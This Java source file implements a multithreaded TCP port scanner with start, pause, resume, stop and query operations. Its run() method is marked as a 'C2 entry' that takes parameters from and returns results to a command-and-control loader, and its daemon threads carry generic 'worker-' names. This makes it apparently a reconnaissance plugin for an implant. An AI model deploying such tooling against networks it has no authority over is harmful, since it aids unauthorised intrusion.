package org.leo.core.component;

import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * 端口扫描组件
 * 提供多线程异步端口扫描功能，兼容Java 1.5+
 *
 * @author LeoSpring
 * @version 2.1
 */
public class PortScanComponent implements Runnable, ThreadFactory {

    private static final int MAX_THREADS = 64;
    private static final int MAX_TASKS = 64;
    private static final int MAX_TIMEOUT_MS = 300000;
    private static final long STOPPED_TASK_TTL_MILLIS = 30L * 60L * 1000L;
    private static final AtomicInteger THREAD_SEQUENCE = new AtomicInteger();

    private HashMap<String, Object> params;
    private HashMap<String, Object> results;


    // 存储所有扫描任务的状态和结果
    private static ConcurrentHashMap scanTasks = new ConcurrentHashMap();
    
    // 存储每个任务的锁对象（用于暂停/继续）
    private static ConcurrentHashMap taskLocks = new ConcurrentHashMap();
    
    // 扫描任务状态常量
    private static final String STATE_RUNNING = "RUNNING";
    private static final String STATE_PAUSED = "PAUSED";
    private static final String STATE_STOPPED = "STOPPED";


    // 用于单个端口扫描的实例变量
    private String scanHost;
    private Integer scanPort;
    private int scanTimeout;

    private String taskId;
    private boolean workerMode;
    private String threadSeed;



    



    public void invoke() throws Exception {
        cleanupStoppedTasks();
        Object methodObj = params.get("methodName");
        if (!(methodObj instanceof String)) {
            results.put("code", Integer.valueOf(400));
            results.put("msg", "methodName required");
            return;
        }
        String methodName = (String) methodObj;
        if ("startScan".equals(methodName)){
            String taskId=startScan(params);
            results.put("taskId",taskId);
            results.put("code",200);
        } else if ("queryResult".equals(methodName)){
            String taskId= (String) params.get("taskId");
            HashMap scanTaskInfo= (HashMap) scanTasks.get(taskId);
            if (scanTaskInfo == null) {
                results.put("code", Integer.valueOf(404));
                results.put("msg", "任务不存在");
                return;
            }
            Object taskLock = taskLocks.get(taskId);
            HashMap snapshot;
            if (taskLock != null) {
                synchronized (taskLock) {
                    snapshot = new HashMap(scanTaskInfo);
                }
            } else {
                snapshot = new HashMap(scanTaskInfo);
            }
            AtomicInteger completedCount = (AtomicInteger) scanTaskInfo.get("completedCount");
            Integer completed = Integer.valueOf(completedCount != null ? completedCount.get() : 0);
            snapshot.put("scannedCount", completed);
            snapshot.put("completedCount", completed);
            snapshot.remove("executor");
            List ports = (List) scanTaskInfo.get("openPortList");
            if (ports != null) {
                synchronized (ports) {
                    snapshot.put("openPortList", new ArrayList(ports));
                }
            }
            results.put("scanTaskInfo",snapshot);
            results.put("code",200);
        } else if ("pauseScan".equals(methodName)){
            String taskId= (String) params.get("taskId");
            pauseScan(taskId);
            results.put("code",200);
            results.put("msg","暂停扫描成功");
        } else if ("resumeScan".equals(methodName)){
            String taskId= (String) params.get("taskId");
            resumeScan(taskId);
            results.put("code",200);
            results.put("msg","继续扫描成功");
        } else if ("stopScan".equals(methodName)){
            String taskId= (String) params.get("taskId");
            stopScan(taskId);
            results.put("code",200);
            results.put("msg","终止扫描成功");
        } else {
            results.put("code", Integer.valueOf(400));
            results.put("msg", "未知 methodName: " + methodName);
        }

    }

    public PortScanComponent() {
    }

    public PortScanComponent(String scanHost, Integer scanPort, int scanTimeout, String taskId) {
        this.scanHost = scanHost;
        this.scanPort = scanPort;
        this.scanTimeout = scanTimeout;
        this.taskId=taskId;
        this.workerMode = true;
    }

    @Override
    public void run() {
        // C2 入口：newInstance() 创建时字段为 null，线程工人构造器会设置字段
        if (!workerMode) {
            java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
            try {
                params = (java.util.HashMap) h.invoke(null, null, null);
                results = new java.util.HashMap();
                invoke();
            } catch (Throwable t) {
                if (results == null) results = new java.util.HashMap();
                results.put("code", Integer.valueOf(500));
                results.put("msg", t.getMessage());
            }
            if (results != null) {
                try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
            }
            return;
        }
        HashMap scanTaskInfo= (HashMap) scanTasks.get(taskId);
        if (scanTaskInfo == null) {
            return; // 任务不存在，直接返回
        }
        
        // 获取任务的锁对象
        Object lock = taskLocks.get(taskId);
        if (lock == null) {
            lock = new Object();
            Object existing = taskLocks.putIfAbsent(taskId, lock);
            if (existing != null) {
                lock = existing;
            }
        }
        
        // 等待直到任务状态为运行中或已终止
        synchronized (lock) {
            String status = (String) scanTaskInfo.get("status");
            while (STATE_PAUSED.equals(status)) {
                try {
                    lock.wait(); // 暂停时等待
                    status = (String) scanTaskInfo.get("status");
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return;
                }
            }
            
            // 如果已终止，直接返回
            if (STATE_STOPPED.equals(status)) {
                return;
            }
        }
        
        // 执行扫描
        List openPortList= (List) scanTaskInfo.get("openPortList");
        AtomicInteger completedCount = (AtomicInteger) scanTaskInfo.get("completedCount");
        int portLength=((Number) scanTaskInfo.get("portLength")).intValue();

        synchronized (lock) {
            if (STATE_STOPPED.equals(scanTaskInfo.get("status"))) return;
        }

        // 再次检查状态（可能在等待期间被终止）
        int count;
        try {
            boolean open = scanPort(scanHost,scanPort,scanTimeout);
            synchronized (lock) {
                if (open && !STATE_STOPPED.equals(scanTaskInfo.get("status"))) {
                    openPortList.add(scanPort);
                }
            }
        } finally {
            // 即使单个任务异常也必须推进计数，避免任务永久停在 RUNNING。
            count = completedCount.incrementAndGet();
        }
        // 使用同步块确保状态更新的原子性
        synchronized (lock) {
            if (count >= portLength){
                finishTask(scanTaskInfo, false);
            }
        }
    }


    private String startScan(HashMap params){
        cleanupStoppedTasks();
        if (scanTasks.size() >= MAX_TASKS) {
            throw new IllegalStateException("too many scan tasks, max=" + MAX_TASKS);
        }
        String scanHost= (String) params.get("scanHost");
        int[] scanPorts= (int[]) params.get("scanPorts");
        if (scanHost == null || scanHost.trim().length() == 0) {
            throw new IllegalArgumentException("scanHost 不能为空");
        }
        if (scanPorts == null || scanPorts.length == 0) {
            throw new IllegalArgumentException("scanPorts 不能为空");
        }
        for (int i = 0; i < scanPorts.length; i++) {
            if (scanPorts[i] < 1 || scanPorts[i] > 65535) {
                throw new IllegalArgumentException("端口超出范围: " + scanPorts[i]);
            }
        }
        int scanTimeout= params.get("scanTimeout") instanceof Number
                ? ((Number) params.get("scanTimeout")).intValue() : 3000;
        if (scanTimeout <= 0) scanTimeout = 3000;
        if (scanTimeout > MAX_TIMEOUT_MS) scanTimeout = MAX_TIMEOUT_MS;
        int threadsNum= params.get("threadsNum") instanceof Number
                ? ((Number) params.get("threadsNum")).intValue() : 10;
        if (threadsNum <= 0) threadsNum = 1;
        if (threadsNum > MAX_THREADS) threadsNum = MAX_THREADS;
        if (threadsNum > scanPorts.length) threadsNum = scanPorts.length;
        HashMap scanTaskInfo=new HashMap();
        String taskId=UUID.randomUUID().toString();
        threadSeed = String.valueOf(params.get("hostId")) + "|" + taskId;
        ExecutorService pool = Executors.newFixedThreadPool(threadsNum, this);
        scanTaskInfo.put("taskId",taskId);
        scanTaskInfo.put("status", STATE_RUNNING); // 使用status记录状态，初始为运行中
        scanTaskInfo.put("portLength",scanPorts.length);
        scanTaskInfo.put("createdAt", Long.valueOf(System.currentTimeMillis()));
        // 为任务创建锁对象
        taskLocks.put(taskId, new Object());
        // 使用线程安全的列表
        scanTaskInfo.put("openPortList",Collections.synchronizedList(new ArrayList()));
        // 使用原子计数器跟踪已完成的扫描数量
        scanTaskInfo.put("completedCount",new AtomicInteger(0));
        scanTaskInfo.put("executor", pool);
        scanTasks.put(taskId,scanTaskInfo);
        try {
            for (int i = 0; i < scanPorts.length; i++) {
                pool.execute(new PortScanComponent(scanHost,scanPorts[i],scanTimeout,taskId));
            }
        } catch (RuntimeException e) {
            pool.shutdownNow();
            scanTasks.remove(taskId);
            taskLocks.remove(taskId);
            throw e;
        }
        pool.shutdown();
        return taskId;
    }

    public Thread newThread(Runnable task) {
        Thread thread = new Thread(task, workerThreadName(threadSeed));
        thread.setDaemon(true);
        return thread;
    }

    private static String workerThreadName(String seed) {
        return "worker-" + Integer.toHexString(String.valueOf(seed).hashCode()) + "-"
                + THREAD_SEQUENCE.incrementAndGet();
    }

    private Boolean scanPort(String host,int port,int scanTimeout){
        Socket socket = null;
        try {
            socket = new Socket();
            socket.connect(new InetSocketAddress(host, port), scanTimeout);
            return true;
        } catch (Exception var14) {
            return false;
        }finally {
            if (socket != null) {
                try { socket.close(); } catch (Exception ignored) {}
            }
        }
    }
    
    /**
     * 暂停扫描任务
     */
    private void pauseScan(String taskId) throws Exception {
        HashMap scanTaskInfo = (HashMap) scanTasks.get(taskId);
        if (scanTaskInfo == null) {
            throw new Exception("任务不存在");
        }
        Object lock = taskLocks.get(taskId);
        if (lock == null) throw new Exception("任务锁不存在");
        synchronized (lock) {
            String status = (String) scanTaskInfo.get("status");
            if (STATE_STOPPED.equals(status)) throw new Exception("任务已终止，无法暂停");
            if (STATE_PAUSED.equals(status)) throw new Exception("任务已处于暂停状态");
            scanTaskInfo.put("status", STATE_PAUSED);
        }
    }
    
    /**
     * 继续扫描任务
     */
    private void resumeScan(String taskId) throws Exception {
        HashMap scanTaskInfo = (HashMap) scanTasks.get(taskId);
        if (scanTaskInfo == null) {
            throw new Exception("任务不存在");
        }
        Object lock = taskLocks.get(taskId);
        if (lock == null) throw new Exception("任务锁不存在");
        synchronized (lock) {
            String status = (String) scanTaskInfo.get("status");
            if (STATE_STOPPED.equals(status)) throw new Exception("任务已终止，无法继续");
            if (STATE_RUNNING.equals(status)) throw new Exception("任务正在运行中，无需继续");
            scanTaskInfo.put("status", STATE_RUNNING);
            lock.notifyAll(); // 唤醒所有等待的线程
        }
    }
    
    /**
     * 终止扫描任务
     */
    private void stopScan(String taskId) throws Exception {
        HashMap scanTaskInfo = (HashMap) scanTasks.get(taskId);
        if (scanTaskInfo == null) {
            throw new Exception("任务不存在");
        }
        Object lock = taskLocks.get(taskId);
        if (lock == null) throw new Exception("任务锁不存在");
        synchronized (lock) {
            String status = (String) scanTaskInfo.get("status");
            if (STATE_STOPPED.equals(status)) throw new Exception("任务已终止");
        }
        finishTask(scanTaskInfo, true);
    }

    private static void finishTask(HashMap scanTaskInfo, boolean interrupt) {
        Object taskId = scanTaskInfo.get("taskId");
        Object lock = taskLocks.get(taskId);
        Object monitor = lock != null ? lock : scanTaskInfo;
        ExecutorService executor;
        synchronized (monitor) {
            scanTaskInfo.put("status", STATE_STOPPED);
            if (scanTaskInfo.get("finishedAt") == null) {
                scanTaskInfo.put("finishedAt", Long.valueOf(System.currentTimeMillis()));
            }
            executor = (ExecutorService) scanTaskInfo.remove("executor");
            monitor.notifyAll();
        }
        if (interrupt && executor != null) executor.shutdownNow();
    }

    private void cleanupStoppedTasks() {
        long now = System.currentTimeMillis();
        Iterator it = ((Map) scanTasks).keySet().iterator();
        while (it.hasNext()) {
            Object id = it.next();
            Map task = (Map) scanTasks.get(id);
            if (task == null || !STATE_STOPPED.equals(task.get("status"))) continue;
            Object finishedObj = task.get("finishedAt");
            long age = finishedObj instanceof Number
                    ? now - ((Number) finishedObj).longValue() : -1L;
            if (age >= 0 && age > STOPPED_TASK_TTL_MILLIS) {
                scanTasks.remove(id);
                taskLocks.remove(id);
            }
        }
    }
}
